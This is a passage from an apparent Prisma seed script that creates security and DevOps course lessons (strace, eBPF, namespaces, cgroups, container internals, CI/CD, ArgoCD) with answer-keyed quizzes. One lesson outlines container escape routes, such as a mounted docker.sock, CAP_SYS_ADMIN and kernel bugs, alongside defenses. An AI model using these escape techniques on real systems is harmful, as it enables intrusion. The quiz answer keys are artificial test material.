- Use strace -c for summary statistics and -T for timing analysis
- System call monitoring is a foundation for security tools like seccomp and behavioral analysis
- strace can diagnose startup issues, find missing files, and analyze program behavior

### References & Further Reading
- strace man page: https://man7.org/linux/man-pages/man1/strace.1.html
- Linux System Call Table: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
- How strace Works: https://www.kernel.org/doc/html/latest/`,
      },
    });

    await createQuizWithQuestions(prisma, kernelL2.id, [
      {
        text: "What does the strace -c flag do?",
        answers: [
          { text: "Traces only file-related syscalls", isCorrect: false },
          { text: "Shows a summary of syscall counts and time spent", isCorrect: true },
          { text: "Traces child processes", isCorrect: false },
          { text: "Outputs in CSV format", isCorrect: false },
        ],
      },
      {
        text: "In strace output, what does \"open(\\\"/etc/passwd\\\", O_RDONLY) = 3\" indicate?",
        answers: [
          { text: "The file was opened for writing with file descriptor 3", isCorrect: false },
          { text: "The file was opened for reading and assigned file descriptor 3", isCorrect: true },
          { text: "The file open failed with error code 3", isCorrect: false },
          { text: "The file was opened 3 times", isCorrect: false },
        ],
      },
      {
        text: "Which strace flag filters for network-related system calls only?",
        answers: [
          { text: "-e trace=file", isCorrect: false },
          { text: "-e trace=network", isCorrect: true },
          { text: "-e trace=process", isCorrect: false },
          { text: "-e trace=memory", isCorrect: false },
        ],
      },
      {
        text: "Why is system call monitoring important for security?",
        answers: [
          { text: "It increases network speed", isCorrect: false },
          { text: "It enables behavioral analysis and sandbox enforcement", isCorrect: true },
          { text: "It replaces firewalls", isCorrect: false },
          { text: "It only works on legacy systems", isCorrect: false },
        ],
      },
    ]);

    const kernelL3 = await prisma.lesson.create({
      data: {
        sectionId: kernelSec3.id,
        title: "eBPF Introduction",
        order: 3,
        content: `# eBPF Introduction

### Learning Objectives
- Understand what eBPF is and why it represents a paradigm shift in Linux kernel programmability
- Explain the eBPF architecture: verifier, JIT compiler, maps, and helper functions
- Write basic eBPF programs for tracing system calls, network events, and kernel functions
- Use eBPF tools like bcc and bpftrace for real-time system analysis
- Understand the security model of eBPF and its applications in kernel security

### What Is eBPF?

eBPF (extended Berkeley Packet Filter) is a revolutionary technology that allows running sandboxed programs in the Linux kernel without modifying kernel source code or loading kernel modules. It provides:

- **Safe Kernel Programmability**: Programs are verified by the kernel verifier before execution
- **High Performance**: eBPF programs are JIT-compiled to native machine code
- **Rich Hook Points**: Attach to system calls, network events, kernel functions, tracepoints, and more
- **Zero Deployment**: No kernel module loading required; programs can be updated without rebooting

eBPF has transformed Linux from a fixed-function kernel to a programmable platform. It powers modern observability tools, networking (Cilium), security (Falco), and service meshes (Istio with eBPF).

### eBPF Architecture

An eBPF program consists of:

1. **eBPF Bytecode**: Compiled from C (using clang/LLVM) or written directly in assembly
2. **Verifier**: Static analysis that ensures the program terminates, doesn't crash the kernel, and only accesses allowed memory
3. **JIT Compiler**: Converts verified bytecode to native machine code for near-zero overhead
4. **eBPF Maps**: Shared data structures between kernel and user-space for configuration and results
5. **Helper Functions**: Kernel-provided APIs for common operations (logging, time, networking)

### Writing eBPF Programs

A simple eBPF program that traces the open() system call:

\`\`\`c
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

SEC("tracepoint/syscalls/sys_enter_openat")
int handle_openat(struct trace_event_raw_sys_enter *ctx) {
    char filename[256];
    bpf_probe_read_user_str(filename, sizeof(filename),
                           (void *)ctx->args[1]);
    bpf_printk("openat: filename=%s\n", filename);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
\`\`\`

Compile and load:

\`\`\`bash
# Compile to eBPF bytecode
clang -O2 -target bpf -c openat.c -o openat.o

# Load with libbpf
bpftool prog load openat.o /sys/fs/bpf/openat

# View output
cat /sys/kernel/debug/tracing/trace_pipe
\`\`\`

### eBPF Tools Ecosystem

**bcc (BPF Compiler Collection)**: Python-based tools for tracing:

\`\`\`bash
# Trace file opens by process
sudo opensnoop

# Trace system call latency
sudo funccount 'sys_*'

# Profile CPU usage at the function level
sudo profile

# Trace TCP connections
sudo tcpconnect

# Trace file modifications
sudo fileslower 10   # Files slower than 10ms
\`\`\`

**bpftrace**: High-level tracing language:

\`\`\`bash
# Trace open() system calls with filenames
sudo bpftrace -e 'tracepoint:syscalls:sys_enter_openat { printf("%s %s\n", comm, str(args->filename)); }'

# Count syscalls per process
sudo bpftrace -e 'tracepoint:raw_syscalls:sys_enter { @[comm] = count(); }'

# Measure function latency histogram
sudo bpftrace -e 'kretprobe:vfs_read { @us = hist(nsecs - @start[tid]); }'
\`\`\`

### eBPF for Security

eBPF enables powerful security applications:

- **Runtime Security**: Falco and Tetragon use eBPF to detect suspicious behavior in real-time
- **Network Security**: Cilium implements network policies and encryption at the kernel level
- **Container Security**: Trace runtime behavior of containers without modifying the container
- **Audit**: Record all system calls made by specific processes for compliance

### The eBPF Verifier

Before any eBPF program runs, the kernel verifier checks:

1. **Termination**: The program must always terminate (no infinite loops without bounded iteration)
2. **Memory Safety**: No out-of-bounds memory access, no use-after-free, no null pointer dereference
3. **Privilege**: The program can only access memory and resources it has permission to
4. **Complexity Limits**: The program must complete verification within a bounded number of instructions

The verifier is the security boundary that makes eBPF safe for kernel execution.

### Hands-On Practice

1. **bcc Tracing**: Install bcc-tools and use opensnoop to trace all file opens on your system for 30 seconds. Identify the most frequently opened files and which processes open them.
2. **bpftrace Script**: Write a bpftrace script that traces all TCP connect() calls and prints the destination IP and port for each connection.
3. **eBPF Network Monitoring**: Use bcc's tcpconnect tool to identify all outgoing TCP connections from your system. Categorize them by process name and destination port.

### Key Takeaways
- eBPF allows running verified, JIT-compiled programs in the kernel without modules
- The verifier ensures safety by checking termination, memory safety, and privilege
- bcc and bpftrace provide high-level interfaces for writing eBPF programs
- eBPF powers modern security, observability, and networking tools
- eBPF maps enable communication between kernel programs and user-space applications

### References & Further Reading
- eBPF.io: https://ebpf.io/
- BCC Tools Documentation: https://github.com/iovisor/bcc
- Bpftrace Reference Guide: https://github.com/bpftrace/bpftrace
- Liz Rice - Learning eBPF (O'Reilly): https://www.oreilly.com/library/view/learning-ebpf/9781098135119/`,
      },
    });

    await createQuizWithQuestions(prisma, kernelL3.id, [
      {
        text: "What component of eBPF ensures program safety before execution?",
        answers: [
          { text: "JIT compiler", isCorrect: false },
          { text: "eBPF verifier", isCorrect: true },
          { text: "Helper functions", isCorrect: false },
          { text: "eBPF maps", isCorrect: false },
        ],
      },
      {
        text: "How do eBPF programs communicate with user-space applications?",
        answers: [
          { text: "Through system calls only", isCorrect: false },
          { text: "Through eBPF maps (shared data structures)", isCorrect: true },
          { text: "Through /proc filesystem", isCorrect: false },
          { text: "Through shared memory segments", isCorrect: false },
        ],
      },
      {
        text: "Which tool provides a Python-based interface for writing eBPF programs?",
        answers: [
          { text: "gdb", isCorrect: false },
          { text: "bcc (BPF Compiler Collection)", isCorrect: true },
          { text: "strace", isCorrect: false },
          { text: "ltrace", isCorrect: false },
        ],
      },
      {
        text: "What security property does the eBPF verifier enforce?",
        answers: [
          { text: "Programs must use only Python code", isCorrect: false },
          { text: "Programs must terminate, not access memory out of bounds, and only use permitted resources", isCorrect: true },
          { text: "Programs must communicate over HTTPS", isCorrect: false },
          { text: "Programs must be signed by a trusted certificate authority", isCorrect: false },
        ],
      },
    ]);

    const kernelSec4 = await prisma.section.create({
      data: { courseId: kernelCourse.id, title: "4. Containers & Namespaces Deep-Dive", order: 4 },
    });

    const kernelL4 = await prisma.lesson.create({
      data: {
        sectionId: kernelSec4.id,
        title: "Linux Namespaces Explained",
        order: 1,
        content: `# Linux Namespaces Explained

### Learning Objectives
- Understand what Linux namespaces are and how they provide process isolation
- Explain each namespace type: PID, Network, Mount, UTS, IPC, User, and Cgroup
- Create and manage namespaces using the unshare and nsenter commands
- Understand how namespaces are the foundation of container technology
- Identify security implications and limitations of namespace-based isolation

### What Are Namespaces?

Linux namespaces are a kernel feature that partitions system resources so that one set of processes sees one set of resources while another set of processes sees a different set. Namespaces are the fundamental isolation mechanism behind containers.

Namespaces provide:
- **Process Isolation**: Processes in different PID namespaces cannot see or signal each other
- **Network Isolation**: Each network namespace has its own network stack, interfaces, and routing table
- **Filesystem Isolation**: Each mount namespace has its own filesystem view
- **Hostname Isolation**: Each UTS namespace can have its own hostname
- **User Isolation**: Each user namespace can map different UID/GID ranges

### Types of Namespaces

**PID Namespace**: Isolates the process ID number space. Processes in a PID namespace have their own PIDs starting from 1.

\`\`\`bash
# Create a new PID namespace and run a shell
sudo unshare --pid --fork --mount-proc bash

# Inside the namespace, see only namespace processes
ps aux
# PID 1 is bash, not systemd
\`\`\`

**Network Namespace**: Provides an independent network stack including interfaces, routing tables, iptables rules, and sockets.

\`\`\`bash
# Create a new network namespace
sudo ip netns add mynet

# Add a virtual ethernet pair
sudo ip link add veth0 type veth peer name veth1

# Move veth1 into the namespace
sudo ip link set veth1 netns mynet

# Configure interfaces
sudo ip addr add 10.0.0.1/24 dev veth0
sudo ip link set veth0 up
sudo ip netns exec mynet ip addr add 10.0.0.2/24 dev veth1
sudo ip netns exec mynet ip link set veth1 up
sudo ip netns exec mynet ip link set lo up

# Test connectivity
sudo ip netns exec mynet ping 10.0.0.1
\`\`\`

**Mount Namespace**: Isolates the filesystem mount points. Each mount namespace has its own set of mounted filesystems.

**UTS Namespace**: Isolates the hostname and domain name, allowing each container to have its own hostname.

**IPC Namespace**: Isolates System V IPC objects and POSIX message queues, preventing processes in different namespaces from communicating via shared memory.

**User Namespace**: Maps UIDs and GIDs between the namespace and the host, allowing a process to have root privileges inside the namespace while being unprivileged outside.

**Cgroup Namespace**: Provides an isolated view of /proc/self/cgroup, hiding the actual cgroup hierarchy from the namespace.

### Managing Namespaces with unshare and nsenter

\`\`\`bash
# Create new namespaces and run a command
sudo unshare --pid --net --mount --fork bash

# Enter an existing namespace
sudo nsenter --target <PID> --pid --net --mount

# List all namespaces on the system
lsns

# Show namespace information for a process
lsns -p <PID>
\`\`\`

### Namespaces and Containers

Containers are not a separate kernel feature; they are built entirely on namespaces (isolation) and cgroups (resource limits). When you run a Docker container, Docker creates:

- A PID namespace (container sees its own PIDs)
- A network namespace (container has its own network stack)
- A mount namespace (container has its own filesystem)
- A UTS namespace (container has its own hostname)
- An IPC namespace (container has its own IPC)
- A user namespace (container has its own UID mapping)

### Security Implications

- **Namespace Escape**: Vulnerabilities in the kernel can allow breaking out of namespaces
- **Privileged Containers**: Running containers with --privileged effectively disables most namespace isolation
- **Root Mapping**: User namespaces map root inside the container to a non-root user outside, reducing risk
- **Combined with seccomp**: Namespaces provide isolation; seccomp limits system calls for defense in depth

### Hands-On Practice

1. **Namespace Creation**: Use unshare to create a new PID namespace and network namespace. Run ps aux inside and verify only namespace processes are visible.
2. **Network Namespace Isolation**: Create two network namespaces and verify they cannot communicate without explicit network configuration.
3. **Container Analysis**: Use nsenter to enter the namespaces of a running Docker container and examine its view of the filesystem and network.

### Key Takeaways
- Linux namespaces partition system resources for process isolation
- Seven namespace types: PID, Network, Mount, UTS, IPC, User, and Cgroup
- Containers are built entirely on namespaces (isolation) and cgroups (resource limits)
- unshare creates new namespaces; nsenter enters existing namespaces
- Namespace isolation alone is insufficient; combine with seccomp and capability dropping

### References & Further Reading
- Linux Namespaces man pages: https://man7.org/linux/man-pages/man7/namespaces.7.html
- Docker Deep Dive: https://www.docker.com/
- Container Security by Liz Rice (O'Reilly): https://www.oreilly.com/library/view/container-security/9781492056690/`,
      },
    });

    await createQuizWithQuestions(prisma, kernelL4.id, [
      {
        text: "Which namespace type isolates the process ID number space?",
        answers: [
          { text: "Network namespace", isCorrect: false },
          { text: "PID namespace", isCorrect: true },
          { text: "Mount namespace", isCorrect: false },
          { text: "UTS namespace", isCorrect: false },
        ],
      },
      {
        text: "What command creates new namespaces?",
        answers: [
          { text: "nsenter", isCorrect: false },
          { text: "unshare", isCorrect: true },
          { text: "docker create", isCorrect: false },
          { text: "namespace-create", isCorrect: false },
        ],
      },
      {
        text: "What are containers built upon at the kernel level?",
        answers: [
          { text: "Virtual machines and hypervisors", isCorrect: false },
          { text: "Namespaces (isolation) and cgroups (resource limits)", isCorrect: true },
          { text: "Only Docker images", isCorrect: false },
          { text: "Only chroot jails", isCorrect: false },
        ],
      },
      {
        text: "Why are user namespaces important for container security?",
        answers: [
          { text: "They make containers faster", isCorrect: false },
          { text: "They map root inside the container to a non-root user outside, reducing risk", isCorrect: true },
          { text: "They enable network access", isCorrect: false },
          { text: "They are only used for logging", isCorrect: false },
        ],
      },
    ]);

    const kernelL5 = await prisma.lesson.create({
      data: {
        sectionId: kernelSec4.id,
        title: "cgroups & Resource Limits",
        order: 2,
        content: `# cgroups & Resource Limits

### Learning Objectives
- Understand what control groups (cgroups) are and how they manage resource allocation
- Configure CPU, memory, I/O, and network limits for processes using cgroups
- Monitor resource usage of cgroup-managed processes
- Understand the relationship between cgroups and container orchestration
- Implement resource limits for security and performance isolation

### What Are cgroups?

Control groups (cgroups) are a Linux kernel feature that limits, accounts for, and isolates the resource usage of process collections. While namespaces control what a process can see, cgroups control what a process can use.

cgroups manage:
- **CPU**: Time allocation and CPU affinity
- **Memory**: Usage limits and OOM behavior
- **I/O**: Block device bandwidth and IOPS limits
- **Network**: Traffic shaping and bandwidth limits (via tc)
- **PIDs**: Maximum number of processes

### cgroup Versions

Linux has two versions of cgroups:

**cgroups v1** (legacy): Each resource controller has its own hierarchy. Processes can be in different hierarchies for different resources.

**cgroups v2** (unified): A single hierarchy for all resource controllers. Provides a simpler, more consistent interface. Recommended for new systems.

Most modern Linux distributions use cgroups v2 by default.

### Managing cgroups with systemd

systemd provides the easiest interface for cgroup management:

\`\`\`bash
# Run a command with CPU and memory limits
systemd-run --scope -p CPUQuota=200% -p MemoryMax=1G mycommand

# Create a transient service with resource limits
systemd-run --unit=my-worker \
  -p CPUQuota=50% \
  -p MemoryMax=512M \
  -p IOWeight=100 \
  /usr/bin/my-worker

# Check resource usage
systemctl status my-worker
systemd-cgtop
\`\`\`

### Direct cgroup Configuration

For cgroups v2, configure directly in the filesystem:

\`\`\`bash
# Create a cgroup
mkdir /sys/fs/cgroup/mygroup

# Set CPU limit (200ms per 100ms period = 200% of one core)
echo "200000 100000" > /sys/fs/cgroup/mygroup/cpu.max

# Set memory limit (1GB)
echo "1073741824" > /sys/fs/cgroup/mygroup/memory.max

# Add a process to the cgroup
echo <PID> > /sys/fs/cgroup/mygroup/cgroup.procs

# Monitor usage
cat /sys/fs/cgroup/mygroup/cpu.stat
cat /sys/fs/cgroup/mygroup/memory.current
\`\`\`

### Resource Controllers

**CPU Controller**:
- cpu.max: CPU quota (format: "quota period")
- cpu.weight: Relative CPU weight (1-10000, default 100)
- cpu.pressure: CPU pressure stall information

**Memory Controller**:
- memory.max: Hard memory limit
- memory.high: Memory high watermark (triggers reclaim)
- memory.current: Current memory usage
- memory.stat: Detailed memory statistics

**I/O Controller**:
- io.max: I/O bandwidth and IOPS limits
- io.weight: Relative I/O weight
- io.stat: I/O usage statistics

**PIDs Controller**:
- pids.max: Maximum number of processes in the cgroup
- pids.current: Current number of processes

### Monitoring cgroups

\`\`\`bash
# Top-like view of cgroup resource usage
systemd-cgtop

# Detailed cgroup information
systemd-cgls

# Check specific cgroup limits and usage
cat /sys/fs/cgroup/mygroup/memory.max
cat /sys/fs/cgroup/mygroup/memory.current
cat /sys/fs/cgroup/mygroup/cpu.stat
\`\`\`

### cgroups and Containers

When Docker or Kubernetes runs a container, it creates a cgroup for that container with resource limits defined by:

- **Docker**: \`docker run --memory=1g --cpus=2 --blkio-weight=500\`
- **Kubernetes**: \`resources.limits.memory\` and \`resources.limits.cpu\` in pod spec

cgroups prevent a single container from consuming all system resources, ensuring fair resource sharing between containers.

### Hands-On Practice

1. **CPU Limiting**: Use systemd-run to create a process with a 50% CPU limit. Run a CPU-intensive workload and verify it is limited to half the CPU.
2. **Memory Limiting**: Create a process with a 256MB memory limit. Write a program that allocates memory incrementally and observe the OOM behavior.
3. **Monitoring**: Use systemd-cgtop to monitor the resource usage of running containers on your system.

### Key Takeaways
- cgroups limit, account for, and isolate resource usage of process collections
- Namespaces control what processes can see; cgroups control what they can use
- systemd provides the easiest interface for cgroup management
- cgroups v2 is the modern, unified version recommended for new systems
- cgroups are the foundation of container resource limits in Docker and Kubernetes

### References & Further Reading
- Kernel cgroups documentation: https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v2.html
- systemd resource control: https://www.freedesktop.org/software/systemd/man/systemd.resource-control.html
- Understanding cgroups: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/resource_management_guide/`,
      },
    });

    await createQuizWithQuestions(prisma, kernelL5.id, [
      {
        text: "What do cgroups control for processes?",
        answers: [
          { text: "What processes can see", isCorrect: false },
          { text: "What resources processes can use (CPU, memory, I/O)", isCorrect: true },
          { text: "Which files processes can access", isCorrect: false },
          { text: "Which network ports processes can use", isCorrect: false },
        ],
      },
      {
        text: "Which cgroup version is recommended for new systems?",
        answers: [
          { text: "cgroups v1 (legacy)", isCorrect: false },
          { text: "cgroups v2 (unified)", isCorrect: true },
          { text: "Both are equally recommended", isCorrect: false },
          { text: "cgroups v3", isCorrect: false },
        ],
      },
      {
        text: "How do you set a memory limit for a cgroup?",
        answers: [
          { text: "cpu.max", isCorrect: false },
          { text: "memory.max", isCorrect: true },
          { text: "io.weight", isCorrect: false },
          { text: "pids.max", isCorrect: false },
        ],
      },
      {
        text: "What command provides a top-like view of cgroup resource usage?",
        answers: [
          { text: "top", isCorrect: false },
          { text: "systemd-cgtop", isCorrect: true },
          { text: "htop", isCorrect: false },
          { text: "ps aux", isCorrect: false },
        ],
      },
    ]);

    const kernelL6 = await prisma.lesson.create({
      data: {
        sectionId: kernelSec4.id,
        title: "Container Internals from Linux Perspective",
        order: 3,
        content: `# Container Internals from Linux Perspective

### Learning Objectives
- Understand how containers are implemented using Linux kernel features (namespaces, cgroups, capabilities)
- Examine the internal architecture of a running container from the host perspective
- Understand Linux capabilities and how they restrict container privileges
- Analyze container filesystems using UnionFS and overlay mounts
- Identify container escape techniques and defenses

### Container Architecture

Containers are not lightweight virtual machines. They share the host kernel and use Linux kernel features for isolation:

1. **Namespaces**: Provide process, network, and filesystem isolation
2. **cgroups**: Limit CPU, memory, and I/O resource usage
3. **Capabilities**: Fine-grained privilege control
4. **Seccomp**: Restrict system calls available to the container
5. **AppArmor/SELinux**: Mandatory access control policies

### Examining Containers from the Host

From the host, a container is just a regular Linux process with namespace isolation:

\`\`\`bash
# Find the PID of a container's main process
docker inspect --format '{{.State.Pid}}' <container>

# Enter the container's namespaces
nsenter --target <PID> --pid --net --mount

# View the container's cgroup limits
cat /proc/<PID>/cgroup

# View the container's capabilities
cat /proc/<PID>/status | grep Cap

# Decode capabilities
capsh --decode=00000000a80425fb
\`\`\`

### Linux Capabilities

Linux capabilities break the traditional root/non-root dichotomy into fine-grained privileges:

- **CAP_NET_BIND_SERVICE**: Bind to ports below 1024
- **CAP_SYS_ADMIN**: Broad system administration operations
- **CAP_SYS_PTRACE**: Trace arbitrary processes
- **CAP_NET_RAW**: Use raw sockets
- **CAP_DAC_OVERRIDE**: Bypass file permission checks
- **CAP_SYS_MODULE**: Load kernel modules

Docker containers drop most capabilities by default, keeping only:
- CAP_CHOWN, CAP_DAC_OVERRIDE, CAP_FSETID, CAP_FOWNER
- CAP_MKNOD, CAP_NET_RAW, CAP_SETGID, CAP_SETUID
- CAP_SETFCAP, CAP_SETPCAP, CAP_NET_BIND_SERVICE
- CAP_SYS_CHROOT, CAP_KILL, CAP_AUDIT_WRITE

### Container Filesystem

Container filesystems use UnionFS (overlay2 in modern Docker):

\`\`\`bash
# See the container's filesystem layers
docker diff <container>

# Examine the overlay mount
mount | grep overlay

# View the container's rootfs
ls /var/lib/docker/overlay2/<layer>/
\`\`\`

UnionFS layers:
- **Lower layer**: Read-only base image layers
- **Upper layer**: Writable container layer (copy-on-write)
- **Merged view**: Combined view presented to the container

### Container Escape Techniques

Container escape exploits vulnerabilities to break out of isolation:

1. **Kernel Vulnerabilities**: Exploit kernel bugs to escape namespaces (e.g., Dirty COW, CVE-2022-0185)
2. **Misconfigured Capabilities**: CAP_SYS_ADMIN or CAP_SYS_PTRACE can be leveraged for escape
3. **Docker Socket Mounting**: Mounting /var/run/docker.sock allows creating privileged containers
4. **Process Namespace Escape**: Use nsenter to enter host namespaces from a compromised container
5. **Device Access**: Accessing host devices (/dev/sda) can bypass container isolation

### Defenses Against Container Escape

- **Drop Capabilities**: Remove CAP_SYS_ADMIN and CAP_SYS_PTRACE from containers
- **Read-Only Rootfs**: Mount the container filesystem as read-only
- **Seccomp Profiles**: Restrict system calls available to the container
- **AppArmor/SELinux**: Enforce mandatory access control
- **User Namespaces**: Run container root as non-root on the host
- **Pod Security Standards**: Kubernetes admission controllers to enforce security policies

### Hands-On Practice

1. **Container Internals**: Run a Docker container and examine it from the host. Find the container's PID, enter its namespaces, and view its cgroup limits.
2. **Capabilities Analysis**: Decode the capabilities of a running container. Identify which capabilities are dropped and which are retained.
3. **Filesystem Layers**: Examine the overlay filesystem of a container. Modify a file inside the container and observe the copy-on-write behavior.

### Key Takeaways
- Containers are regular Linux processes with namespace isolation and cgroup resource limits
- Linux capabilities provide fine-grained privilege control beyond root/non-root
- Container filesystems use UnionFS with read-only base layers and a writable top layer
- Container escape techniques exploit kernel bugs, misconfigured capabilities, or mounted sockets
- Defense in depth: drop capabilities, use read-only rootfs, apply seccomp profiles, and use AppArmor/SELinux

### References & Further Reading
- Docker Security Best Practices: https://docs.docker.com/engine/security/
- Linux Capabilities man page: https://man7.org/linux/man-pages/man7/capabilities.7.html
- Container Security by Liz Rice: https://www.oreilly.com/library/view/container-security/9781492056690/`,
      },
    });

    await createQuizWithQuestions(prisma, kernelL6.id, [
      {
        text: "What are containers built upon at the Linux kernel level?",
        answers: [
          { text: "Hypervisors and virtual hardware", isCorrect: false },
          { text: "Namespaces, cgroups, capabilities, and seccomp", isCorrect: true },
          { text: "Only Docker images", isCorrect: false },
          { text: "Only chroot jails", isCorrect: false },
        ],
      },
      {
        text: "Which capability should never be granted to a container in production?",
        answers: [
          { text: "CAP_NET_BIND_SERVICE", isCorrect: false },
          { text: "CAP_SYS_ADMIN", isCorrect: true },
          { text: "CAP_CHOWN", isCorrect: false },
          { text: "CAP_SETUID", isCorrect: false },
        ],
      },
      {
        text: "How does UnionFS (overlay2) handle file modifications in a container?",
        answers: [
          { text: "All files are writable in the base layer", isCorrect: false },
          { text: "Modifications trigger copy-on-write to the upper layer", isCorrect: true },
          { text: "Files are duplicated to all layers", isCorrect: false },
          { text: "Modifications are written directly to the host", isCorrect: false },
        ],
      },
      {
        text: "Which command allows entering a container's namespaces from the host?",
        answers: [
          { text: "docker exec", isCorrect: false },
          { text: "nsenter", isCorrect: true },
          { text: "chroot", isCorrect: false },
          { text: "mount", isCorrect: false },
        ],
      },
    ]);

  }

  // ====================================================================
  // 7. Containerization & DevOps
  // ====================================================================
  if (devopsCourse) {
    const devopsSec4 = await prisma.section.create({
      data: { courseId: devopsCourse.id, title: "4. CI/CD & GitOps", order: 4 },
    });

    const devopsL1 = await prisma.lesson.create({
      data: {
        sectionId: devopsSec4.id,
        title: "CI/CD Pipeline Design",
        order: 1,
        content: `# CI/CD Pipeline Design

### Learning Objectives
- Design a robust CI/CD pipeline architecture that supports rapid, reliable software delivery
- Implement pipeline stages for build, test, security scanning, and deployment
- Understand pipeline optimization strategies for speed and reliability
- Implement parallel execution, caching, and artifact management
- Design pipelines for multi-environment deployments (dev, staging, production)

### What Is CI/CD?

**Continuous Integration (CI)** is the practice of frequently merging code changes into a shared repository, with automated builds and tests running on every merge. CI catches integration issues early and ensures code quality.

**Continuous Delivery (CD)** extends CI by automating the release process so that code can be deployed to production at any time with the push of a button. **Continuous Deployment** goes further by automatically deploying every change that passes the pipeline.

### Pipeline Architecture

A production CI/CD pipeline typically includes these stages:

1. **Source**: Code commit triggers the pipeline (webhook from Git)
2. **Build**: Compile source code, build Docker images, resolve dependencies
3. **Test**: Run unit tests, integration tests, end-to-end tests
4. **Security Scan**: SAST, DAST, SCA, container image scanning, secrets detection
5. **Quality Gate**: Enforce coverage thresholds, code quality metrics, security policies
6. **Artifact Registry**: Push Docker images, Helm charts, or binary artifacts to a registry
7. **Deploy to Staging**: Deploy to a staging environment that mirrors production
8. **Integration Tests**: Run tests against the staging environment
9. **Manual Approval**: Require human approval for production deployment
10. **Deploy to Production**: Deploy using rolling updates, blue-green, or canary strategy
11. **Post-Deploy Verification**: Run smoke tests and monitor for errors

### Build Optimization

Speed up your CI/CD pipeline with these techniques:

- **Dependency Caching**: Cache npm, pip, or Maven dependencies between builds
- **Docker Layer Caching**: Use multi-stage Dockerfiles to maximize layer reuse
- **Parallel Execution**: Run independent jobs in parallel (e.g., unit tests and linting)
- **Incremental Builds**: Only rebuild what changed since the last build
- **Build Matrix**: Test across multiple versions of dependencies in parallel

### Pipeline as Code

Define your pipeline in version control alongside your application code:

- **GitHub Actions**: YAML-based workflows in .github/workflows/
- **GitLab CI**: .gitlab-ci.yml with stages, jobs, and rules
- **Jenkins**: Jenkinsfile using declarative or scripted pipelines
- **ArgoCD**: Kubernetes-native pipeline definitions

Benefits of pipeline as code:
- Version controlled and auditable
- Reviewable through pull requests
- Reproducible across environments
- Self-documenting

### Deployment Strategies

**Rolling Update**: Gradually replace old instances with new ones. Zero downtime but slow rollback.

**Blue-Green Deployment**: Maintain two identical environments. Switch traffic from blue to green instantly. Fast rollback by switching back.

**Canary Deployment**: Route a small percentage of traffic to the new version. Gradually increase if no errors. Fast rollback by redirecting traffic.

**Feature Flags**: Deploy code to production but hide new features behind flags. Enable features incrementally without redeployment.

### Hands-On Practice

1. **Pipeline Design**: Design a complete CI/CD pipeline for a Node.js application with Docker deployment. Include all stages from source to production with security gates.
2. **GitHub Actions Workflow**: Implement the pipeline using GitHub Actions. Include dependency caching, parallel test execution, and Docker image building.
3. **Deployment Strategy**: Implement a canary deployment using Kubernetes and Argo Rollouts. Configure automatic rollback if error rates exceed 1%.

### Key Takeaways
- CI/CD pipelines automate the path from code commit to production deployment
- Pipeline stages should include build, test, security scanning, quality gates, and deployment
- Optimize pipeline speed with caching, parallel execution, and incremental builds
- Define pipelines as code for version control, reviewability, and reproducibility
- Choose deployment strategies based on risk tolerance and rollback requirements

### References & Further Reading
- Google SRE Book: https://sre.google/sre-book/table-of-contents/
- GitHub Actions Documentation: https://docs.github.com/en/actions
- Argo Rollouts: https://argo-rollouts.readthedocs.io/`,
      },
    });

    await createQuizWithQuestions(prisma, devopsL1.id, [
      {
        text: "What is the difference between Continuous Delivery and Continuous Deployment?",
        answers: [
          { text: "They are the same thing", isCorrect: false },
          { text: "Continuous Delivery requires manual approval; Continuous Deployment is fully automatic", isCorrect: true },
          { text: "Continuous Deployment is only for open-source projects", isCorrect: false },
          { text: "Continuous Delivery includes security scanning, Continuous Deployment does not", isCorrect: false },
        ],
      },
      {
        text: "Which deployment strategy routes a small percentage of traffic to the new version?",
        answers: [
          { text: "Blue-Green Deployment", isCorrect: false },
          { text: "Rolling Update", isCorrect: false },
          { text: "Canary Deployment", isCorrect: true },
          { text: "Feature Flags", isCorrect: false },
        ],
      },
      {
        text: "What is the primary benefit of defining pipelines as code?",
        answers: [
          { text: "Faster execution speed", isCorrect: false },
          { text: "Version control, reviewability, and reproducibility", isCorrect: true },
          { text: "Lower infrastructure costs", isCorrect: false },
          { text: "Reduced need for testing", isCorrect: false },
        ],
      },
      {
        text: "Which technique speeds up CI/CD by only rebuilding what changed?",
        answers: [
          { text: "Full rebuild every time", isCorrect: false },
          { text: "Incremental builds", isCorrect: true },
          { text: "Manual triggering", isCorrect: false },
          { text: "Sequential execution", isCorrect: false },
        ],
      },
    ]);

    const devopsL2 = await prisma.lesson.create({
      data: {
        sectionId: devopsSec4.id,
        title: "GitOps with ArgoCD",
        order: 2,
        content: `# GitOps with ArgoCD

### Learning Objectives
- Understand the GitOps methodology and how it differs from traditional CI/CD
- Install and configure ArgoCD for Kubernetes-native continuous delivery
- Implement declarative deployment workflows using Git as the single source of truth
- Configure ArgoCD applications, projects, and sync policies
- Implement multi-cluster and multi-tenant ArgoCD setups

### What Is GitOps?

GitOps is an operational framework where Git repositories serve as the single source of truth for declarative infrastructure and application configurations. The core principles are:

1. **Declarative Configuration**: The entire system state is described declaratively (Kubernetes manifests, Helm charts, Kustomize overlays)
2. **Version Controlled**: All configuration changes are committed to Git, providing a complete audit trail
3. **Automated Delivery**: Approved changes are automatically applied to the cluster
4. **Self-Healing**: Controllers detect and correct drift between the desired state in Git and the actual cluster state

GitOps differs from traditional CI/CD:
- **CI/CD**: Pipeline pushes changes to the cluster
- **GitOps**: Cluster pulls changes from Git (pull-based model)

### ArgoCD Architecture

ArgoCD is a Kubernetes-native continuous delivery tool that implements GitOps:

- **ArgoCD Server**: Web UI and API server for managing applications
- **Application Controller**: Watches Git repositories and syncs applications to the cluster
- **Repo Server**: Clones Git repositories and generates Kubernetes manifests
- **Redis**: Caching layer for the API server

### Installing ArgoCD

\`\`\`bash
# Create the argocd namespace
kubectl create namespace argocd

# Install ArgoCD using the official manifest
kubectl apply -n argocd -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml

# Get the initial admin password
kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 -d

# Access the ArgoCD UI
kubectl port-forward svc/argocd-server -n argocd 8080:443
\`\`\`

### Configuring an ArgoCD Application

Create an Application resource to define what to deploy:

\`\`\`yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: my-app
  namespace: argocd
spec:
  project: default
  source:
    repoURL: https://github.com/myorg/my-app-deploy.git
